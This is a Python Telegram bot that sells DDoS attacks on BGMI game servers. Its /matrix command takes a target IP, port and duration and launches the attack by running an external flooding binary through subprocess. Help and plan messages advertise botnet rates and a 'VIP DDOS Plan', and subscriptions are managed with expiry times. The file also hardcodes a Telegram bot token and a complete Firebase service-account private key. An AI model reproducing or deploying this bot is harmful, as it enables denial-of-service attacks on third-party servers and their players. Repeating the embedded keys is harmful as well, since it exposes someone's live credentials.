#!/usr/bin/python3
# MADE BY @its_MATRIX_king
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time 
import logging
import socket
import pytz  # Import pytz for timezone handling
import json
import os
import firebase_admin
from firebase_admin import credentials, firestore

bot = telebot.TeleBot('7858493439:AAGbtHzHHZguQoJzAney4Ccer1ZUisC-bDI')
# Admin user IDs
admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')

# File to store allowed user IDs and their expiration times
USER_FILE = "users.txt"
cooldown_timestamps = {}
# File to store command logs
LOG_FILE = "log.txt"
os.system('chmod +x *')
# Set Indian Standard Time (IST)
IST = pytz.timezone('Asia/Kolkata')

# Absolute path to the ak.bin file (modify this to point to the correct path)
AK_BIN_PATH = 'KALUAA'

# Path to your Firebase service account JSON file
firebase_credentials = {
    "type": "service_account",
  "project_id": "clutch-e8813",
  "private_key_id": "fab5199f51a8a127a3fa964605acc11364506e92",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDBTIMcOYxX1p74\nKaRPsF2aecO6gH0SvyPA97t8mHv425hlDgjs/686PTr0b7vAMHWse/+AwShiC4nt\n9fMcKX6Em2nurDAjTKv2k4ykI0DHLT95k5g2q1EI5jlwisyL7m5TBk87XYLO9Wnp\neKcoDcxk0OvCFhl70bLDyCB30A/pQSa8zHFTiySdwJx4cxsxCgs9R3I61bI46nMr\nS2sAYOcC1UZxD+a3xOCxt6x4SV+XTg/P/NkgRM+wu45gb5/WkYZE/tnOO0cpy71E\nUDEAfNB7ZrlXBXvlXJN7lGtrtizsGG7+q1TJ+x+BnXQaUQY83zrjMT8exsTlpxM4\ncux7s34DAgMBAAECggEAPwmRLli0JIco45xM6fIFrJVuF7nEUCNGaS1BFtJxh4gx\nrC8GCSgfAHqsab+wdm43Se9MNTSI02SY8CIHzNTZXiyCwOOldTWRVQHsWTDn9KyU\naTURbC61aBYQgFu7dhzlHK1PlHgb6xtMlWeT97N8Rxp88Bgd6mvKBSAUOo5/Sd00\nPiVmCo5dSBxKfncJgJmLWf1q+Q0japGr7UAnBmKrAOWgy1NMMoDxWH4PAgZauElK\nR+EqXfvQltq8WqwGV8dlisWbZGMoGsEhICChDInUuUQOcGVefLpqEpT4TcaThf6l\ni8dzJpfmUX48BklDFYST4CY1xpQl+L51pAGsqsrsyQKBgQDynhZX4vCZzV0XkDRX\nEX/6WIM7uUQcbBrbxOsjp8W4dYO5kn06mFged9HkGBwa+/q/LK5FOhdq1FiJIIyD\nJabTR+Rp9v1Eb6IdQbFIgMHkHmnsfhAEobTjYMarglP5tZzKauzrFBVqZWd4+Niv\nBxdIfVXuhuaAvOWtmGTDwvuuiwKBgQDL9gOsNoLvftdyc7d8owV4UsTumj33kWxC\nAO1pivo18RHg/dWd/0AO/na/HyZdoIqwQyd0YJECGy14Zrin5Vd3tqcfY/u2ZHUH\nLgOWVXMBEnHrMDiP5VjsQ6kCK8qGYZuWdkEFoLUkyE9tlJNH3/f5Vh9f8ItOPW+y\nRFR2P+aVaQKBgAuYOoEgu1beVaCWp6mxkGgqarsj83lYQUBXfNVLY0uZch4gPhPa\ny/tIxqMb89vmRulz/TAZwpy8YS7Me2qZFgvq16OoxhnLK/gx94L7hEiem3lN3P4b\nrEVhjp0LsW+xmjiiO4hQgWWASx2g5toWgKpaMw0fLUzhuig9rDMe0mBZAoGATq2j\nMw6AKeTzNUpgMKsuVAERyL0lRFgLu9ZhvwIGjUJmVDV27xDk5CPTKNzaTum8Nkxh\nbupFZduYCccOWm4E9MA37csC8ZQE9PUSGy7xQyubWE9ssk2VpOZgzt6XrIkAnOUX\nJhWdawf+Y9YZjnNeVAed6MOA6XiXmtvy/P6fc2kCgYEA7c11bLTUcR6LfVelL6bk\nJTjCef65BfUiAgwaE6d6jucvzvBoCoaAjJRsgKuUkFG46YLdf+aPJD8ZdamYbY7i\nSPM5SYbEGcArs+gmYthcgGIETfuCta2lLr2wDkNuwhqNX1Q4eXB4byK/w1K++BhK\nCxGU6C7blMRW29VbBd2+xRM=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fkppe@clutch-e8813.iam.gserviceaccount.com",
  "client_id": "106827687554096318106",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fkppe%40clutch-e8813.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

# Initialize Firebase Admin SDK
cred = credentials.Certificate(firebase_credentials)
firebase_admin.initialize_app(cred)

# Initialize Firestore client
db = firestore.client()

# Function to read users from Firestore
def read_users():
    try:
        users_ref = db.collection('users')
        docs = users_ref.stream()
        users = {}
        for doc in docs:
            data = doc.to_dict()
            expiration_time = datetime.fromisoformat(data['expiration']).astimezone(IST)
            users[doc.id] = expiration_time
        return users
    except Exception as e:
        print(f"Error reading users: {e}")
        return {}

# Function to save users to file
def save_user(user_id, expiration_time):
    users_ref = db.collection('users')
    users_ref.document(user_id).set({
        'expiration': expiration_time.isoformat()
    })

# Function to remove expired users
def remove_expired_users():
    users_ref = db.collection('users')
    current_time = datetime.now(IST)
    docs = users_ref.stream()
    for doc in docs:
        data = doc.to_dict()
        expiration_time = datetime.fromisoformat(data['expiration']).astimezone(IST)
        if expiration_time <= current_time:
            users_ref.document(doc.id).delete()


@bot.message_handler(commands=['add'])
def add_user(message):
    remove_expired_users()
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split()
        if len(command) == 3:
            user_to_add = command[1]
            minutes = int(command[2])
            expiration_time = datetime.now(IST) + timedelta(minutes=minutes)

            users = read_users()
            if user_to_add not in users:
                save_user(user_to_add, expiration_time)
                response = f"User {user_to_add} added successfully with expiration time of {minutes} minutes."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID and the expiration time in minutes."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            users = read_users()
            if user_to_remove in users:
                db.collection('users').document(user_to_remove).delete()
                response = f"User {user_to_remove} removed successfully."
            else:
                response = "User not found."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        users = read_users()
        response = "Authorized Users:\n"
        current_time = datetime.now(IST)
        
        if users:
            for user_id, exp_time in users.items():
                if exp_time > current_time:
                    response += f"- {user_id} (Expires at: {exp_time})\n"
        else:
            response = "No active users found."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)
        
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

#Store ongoing attacks globally
ongoing_attacks = []

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    # Track the ongoing attack
    ongoing_attacks.append({
        'user': username,
        'target': target,
        'port': port,
        'time': time,
        'start_time': datetime.now(IST)
    })

    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
    bot.reply_to(message, response)

    full_command = f"./sasuke {target} {port} {time} 60"
    try:
        print(f"Executing command: {full_command}")  # Log the command
        result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
        
        # Remove attack from ongoing list once finished
        ongoing_attacks.remove({
            'user': username,
            'target': target,
            'port': port,
            'time': time,
            'start_time': ongoing_attacks[-1]['start_time']
        })
        
        if result.returncode == 0:
            bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King.\nOutput: {result.stdout}")
        else:
            bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")

        
@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        response = "Ongoing Attacks:\n\n"
        if ongoing_attacks:
            for attack in ongoing_attacks:
                response += (f"User: {attack['user']}\nTarget: {attack['target']}\nPort: {attack['port']}\n"
                             f"Time: {attack['time']} seconds\n"
                             f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        else:
            response += "No ongoing attacks currently."
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to view the status.")
        
# Global dictionary to track cooldown times for users
bgmi_cooldown = {}

@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    
    users = read_users()
    command = message.text.split()
    
    # Initialize response to a default value
    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"

    # Check if the user has any ongoing attacks
    if ongoing_attacks:
        response = "An attack is currently in progress. Please wait until it completes before starting a new one."
    elif user_id in admin_owner or user_id in users:
        if user_id in admin_owner:
            # Admin owner can bypass cooldown
            if len(command) == 4:  # Ensure proper command format (no threads argument)
                try:
                    target = command[1]
                    port = int(command[2])  # Convert port to integer
                    time = int(command[3])  # Convert time to integer

                    if time > 180:
                        response = "Error: Time interval must be 180 seconds or less"
                    else:
                        # Start the attack without setting a cooldown for admin owners
                        start_attack_reply(message, target, port, time)
                        return  # Early return since response is handled in start_attack_reply
                except ValueError:
                    response = "Error: Please ensure port and time are integers."
            else:
                response = "Usage: /matrix <target> <port> <time>"
        else:
            # Non-admin users, check if they are within the cooldown period
            if user_id in bgmi_cooldown:
                cooldown_expiration = bgmi_cooldown[user_id]
                current_time = datetime.now(pytz.timezone('Asia/Kolkata'))  # Get current time in IST
                if current_time < cooldown_expiration:
                    time_left = (cooldown_expiration - current_time).seconds
                    response = f"You need to wait {time_left} seconds before using the /matrix command again."
                else:
                    # Cooldown has expired, proceed with the command
                    if len(command) == 4:  # Ensure proper command format (no threads argument)
                        try:
                            target = command[1]
                            port = int(command[2])  # Convert port to integer
                            time = int(command[3])  # Convert time to integer

                            if time > 180:
                                response = "Error: Time interval must be 180 seconds or less"
                            else:
                                # Start the attack and set the new cooldown
                                start_attack_reply(message, target, port, time)
                                bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
                                return  # Early return since response is handled in start_attack_reply
                        except ValueError:
                            response = "Error: Please ensure port and time are integers."
                    else:
                        response = "Usage: /matrix <target> <port> <time>"
            else:
                # User not in cooldown, proceed with the command
                if len(command) == 4:  # Ensure proper command format (no threads argument)
                    try:
                        target = command[1]
                        port = int(command[2])  # Convert port to integer
                        time = int(command[3])  # Convert time to integer

                        if time > 180:
                            response = "Error: Time interval must be 180 seconds or less"
                        else:
                            # Start the attack and set the new cooldown
                            start_attack_reply(message, target, port, time)
                            bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
                            return  # Early return since response is handled in start_attack_reply
                    except ValueError:
                        response = "Error: Please ensure port and time are integers."
                else:
                    response = "Usage: /matrix <target> <port> <time>"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = str(message.chat.id)

    with open('owner.txt', "r") as file:
        owners = file.read().splitlines()

    help_text = '''Available commands:
    /matrix : Method For Bgmi Servers. 
    /rulesanduse : Please Check Before Use !!.
    /plan : Checkout Our Botnet Rates.
    '''

    if user_id in owners:
        help_text += '''
To See Admin Commands:
    /admincmd : Shows All Admin Commands.
        '''

    help_text += ''' 
JOIN CHANNEL - @MATRIX_CHEATS
BUY / OWNER - @its_MATRIX_King
    '''

    bot.reply_to(message, help_text)
    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @MATRIX_CHEATS\nBUY / OWNER - @its_MATRIX_King "
    bot.reply_to(message, response)

@bot.message_handler(commands=['rulesanduse'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Time Should Be 180 or Below
2. Click /status Before Entering Match
3. If There Are Any Ongoing Attacks You Cant use Wait For Finish
JOIN CHANNEL - @MATRIX_CHEATS
BUY / OWNER - @its_MATRIX_King '''
   
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 
    Purchase VIP DDOS Plan From @its_Matrix_King
    Join Channel @MATRIX_CHEATS
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_id = str(message.chat.id)

    # Check if user is in owners.txt
    with open('owner.txt', "r") as file:
        owners = file.read().splitlines()

    if user_id in owners:
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:

        /add <userId> : Add a User.
        /remove <userId> : Remove a User.
        /allusers : Authorized Users List.
        /broadcast : Broadcast a Message.
        Channel - @MATRIX_CHEATS
        Owner/Buy - @its_Matrix_King
        '''
        bot.reply_to(message, response)
    else:
        response = "You do not have permission to access admin commands."
        bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open('users.txt', "r") as file:
                users = file.read().splitlines()
                if users:
                    for user in users:
                        try:
                            bot.send_message(user, message_to_broadcast)
                        except Exception as e:
                            print(f"Failed to send broadcast message to user {user}: {str(e)}")
                    response = "Broadcast Message Sent Successfully To All Users."
                else:
                    response = "No users found in users.txt."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

def run_bot():
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")
            time.sleep(15)  # Sleep before restarting the bot


if __name__ == "__main__":
    run_bot()
